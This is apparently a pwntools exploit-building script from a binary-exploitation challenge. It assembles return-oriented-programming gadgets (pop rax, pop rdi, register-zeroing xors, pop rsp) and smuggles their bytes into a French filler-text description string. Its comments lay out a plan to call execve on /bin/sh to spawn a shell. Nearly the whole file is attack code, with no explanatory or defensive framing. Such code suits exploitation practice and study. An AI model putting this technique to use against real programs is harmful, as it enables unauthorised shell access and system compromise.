from pwn import *

context.arch = "amd64"
# for reg in ["rax" ,"rbx" ,"rcx" ,"rdx" ,"rsi" ,"rdi" ,"rbp" ,"rsp" ,"r8 " ,"r9 " ,"r10" ,"r11" ,"r12" ,"r13" ,"r14" ,"r15"]:
    # string = "pop " + reg + "; ret"
    # print(string)
    # code = asm(string) + b"\x83"
    # print(enhex(code))
    # open("out", "wb").write(code)
    # os.system("cat out")
    # print()




###
#AVAILABLE GADGETS:

#- write syscall gadget
#- read syscall gadget
#- pop rbp 
#- mov eax, dword ptr [rbp - 4]; pop rbp; ret;

# REQUIRED GADGETS:

# /bin/sh somewhere
# set rax to 0x3b
# pop rdi to set the pointer of /bin/sh
# set rsi to 0 
# set rdx to 0 


# SYSCALL THAT I GIVE YOU:
# the first:
    # use the normal write syscall
# the second:
    # pop r8; ret
    # mov rax, r8; ret
# the third:
    # pop rdi
# the fourth:
    # xor rsi, rsi; ret
# the fifth:
    # xor rdx, rdx; ret
### 

gadget_1 = asm("pop rax; ret") + b"\x83"
gadget_2 = asm("pop r8; ret") + b"\x83"
gadget_3 = asm("mov rax, r8; ret") + b"\x83"
gadget_4 = asm("pop rdi; ret") + b"\x83"
gadget_5 = asm("xor rsi, rsi; ret") + b"\x83"
gadget_6 = asm("xor rdx, rdx; ret") + b"\x83"
gadget_7 = asm("pop rsp; ret") + b"\x83"

desc =  "La vérité est que la douleur elle-même est importante, elle est suivie d'éducation, mais cel".encode('utf-8')#a
print(len(desc))
desc += gadget_1
desc += "arrive ".encode('utf-8')#à 
print(len(desc))
desc += gadget_2
desc += " un moment où il y a du grand travail et de la douleur. Car j'irai au fond des choses, personne ne devrait pratiquer aucun type de travail ".encode('utf-8')#à
print(len(desc))
desc += gadget_3
desc += " moins qu'il n'en tire quelque ".encode('utf-8') #a
print(len(desc))
desc += gadget_4
desc += "vantage. il veut être un cheveu de douleur, qu'il fuie la joie, et personne n'enfantera. ".encode('utf-8')#A 
print(len(desc))
desc += gadget_5
desc += " moins qu'ils ne soient aveuglés par le désir, ils ne sortent pas, ils sont fautifs ceux qui abandonnent. leurs devoirs, et l'".encode('utf-8')#â 
print(len(desc))
desc += gadget_6
desc += "me s'adoucit, c'est-".encode('utf-8')#à"-dire"
print(len(desc))
desc += gadget_7
desc += "-dire les travaux.".encode('utf-8') 

with open("out", "wb") as f:
    f.write(desc)


with open("out2", "w") as f:
    for b in desc:
        f.write("\\x" + hex(b)[2:])

os.system("cat out")
os.system("cat out2")
